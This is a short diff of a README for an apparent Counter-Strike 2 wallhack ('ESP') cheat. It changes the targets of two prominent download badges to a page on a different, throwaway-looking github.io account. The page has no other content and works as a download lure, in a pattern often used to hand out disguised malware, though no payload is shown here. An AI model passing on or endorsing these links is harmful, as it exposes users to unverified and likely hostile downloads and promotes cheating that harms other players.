@@ -1,7 +1,7 @@
 # CS2 — ESP
 
-[![Download Setup](https://img.shields.io/badge/Download-Setup-blueviolet)](https://cs2-wallhack-esp.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://cs2-wallhack-esp.github.io/.github/)
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blueviolet)](https://slaffbrausepm8v.github.io/.github/cs2-wallhack-esp)  
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://slaffbrausepm8v.github.io/.github/cs2-wallhack-esp)
 
 ---
 
